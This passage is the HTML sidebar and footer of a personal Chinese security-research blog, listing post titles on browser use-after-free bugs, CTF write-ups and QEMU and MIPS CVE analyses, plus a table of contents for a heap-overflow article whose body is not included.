S.E.H深入分析</div></div></a></div><div><a href="/2019/11/07/浏览器UAF/" title="IE8的一个释放后重用(UAF):CVE-2013-3893"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/NKHE2n.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-07</div><div class="title">IE8的一个释放后重用(UAF):CVE-2013-3893</div></div></a></div><div><a href="/2019/09/22/19宿迁/" title="19江苏省省赛-宿迁"><img class="cover" src="https://s2.ax1x.com/2019/09/21/nxCsat.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-09-22</div><div class="title">19江苏省省赛-宿迁</div></div></a></div><div><a href="/2019/10/26/Gusubei/" title="从东南到东南 --姑苏杯信安大赛小记"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/3mxaVq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-26</div><div class="title">从东南到东南 --姑苏杯信安大赛小记</div></div></a></div><div><a href="/2019/11/12/Three-Write/" title="红帽杯PWN题-Three 解析"><img class="cover" src="/img/5WTH0f.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-12</div><div class="title">红帽杯PWN题-Three 解析</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/%E6%88%88%E8%96%87.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Migraine殇</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/migraine-sudo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/migraine-sudo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2576361468@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://twitter.com/0xp0kerface" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎光临寒舍，右下角可以设置夜间模式</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">概述：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8HeapPage%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">使用HeapPage分析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%B0%83%E7%94%A8CalculateMinMax"><span class="toc-number">2.1.</span> <span class="toc-text">第一次调用CalculateMinMax</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%B0%83%E7%94%A8CalculateMinMax"><span class="toc-number">2.2.</span> <span class="toc-text">第二次调用CalculateMinMax</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93"><span class="toc-number">2.3.</span> <span class="toc-text">堆溢出总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">如何利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E6%BC%8F%E5%9C%B0%E5%9D%80"><span class="toc-number">4.</span> <span class="toc-text">泄漏地址</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%83%A8%E5%88%86"><span class="toc-number">4.1.</span> <span class="toc-text">利用部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windbg%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B0%8F%E6%8A%80%E5%B7%A7-%E6%AF%8F%E6%AC%A1%E5%AE%9E%E8%B7%B5%E4%B8%AD%E8%AE%B0%E4%B8%80%E4%BA%9B"><span class="toc-number">4.2.</span> <span class="toc-text">Windbg的几个小技巧[每次实践中记一些]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%BD%95"><span class="toc-number">5.</span> <span class="toc-text">附录</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2099/12/14/Diary/" title="Diary"><img src="/img/IMG_7932.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Diary"/></a><div class="content"><a class="title" href="/2099/12/14/Diary/" title="Diary">Diary</a><time datetime="2099-12-13T16:01:36.000Z" title="发表于 2099-12-14 00:01:36">2099-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/30/nexus5/" title="Nexus5折腾小记"><img src="https://img-blog.csdnimg.cn/img_convert/182eb0788d06c05a6c26308aaa0150a1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nexus5折腾小记"/></a><div class="content"><a class="title" href="/2022/07/30/nexus5/" title="Nexus5折腾小记">Nexus5折腾小记</a><time datetime="2022-07-30T15:54:15.000Z" title="发表于 2022-07-30 23:54:15">2022-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/12/%E7%95%99%E7%BB%99%E8%BF%99%E4%B8%8D%E9%95%BF%E4%B8%8D%E7%9F%AD%E7%9A%84%E6%97%B6%E5%85%89/" title="留给这不长不短的时光"><img src="https://z3.ax1x.com/2021/07/17/W13xu4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="留给这不长不短的时光"/></a><div class="content"><a class="title" href="/2021/07/12/%E7%95%99%E7%BB%99%E8%BF%99%E4%B8%8D%E9%95%BF%E4%B8%8D%E7%9F%AD%E7%9A%84%E6%97%B6%E5%85%89/" title="留给这不长不短的时光">留给这不长不短的时光</a><time datetime="2021-07-12T15:53:34.000Z" title="发表于 2021-07-12 23:53:34">2021-07-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/02/QEMU-CVE-2015-5165/" title="QEMU:CVE-2015-5165"><img src="https://z3.ax1x.com/2021/07/09/RvdfH0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="QEMU:CVE-2015-5165"/></a><div class="content"><a class="title" href="/2021/04/02/QEMU-CVE-2015-5165/" title="QEMU:CVE-2015-5165">QEMU:CVE-2015-5165</a><time datetime="2021-04-02T07:52:34.000Z" title="发表于 2021-04-02 15:52:34">2021-04-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/30/mips-pwn/" title="Mips 漏洞入门与分析（CVE-2020-8423）"><img src="/img/7GdBdp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Mips 漏洞入门与分析（CVE-2020-8423）"/></a><div class="content"><a class="title" href="/2021/01/30/mips-pwn/" title="Mips 漏洞入门与分析（CVE-2020-8423）">Mips 漏洞入门与分析（CVE-2020-8423）</a><time datetime="2021-01-29T17:50:25.000Z" title="发表于 2021-01-30 01:50:25">2021-01-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Migraine殇</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>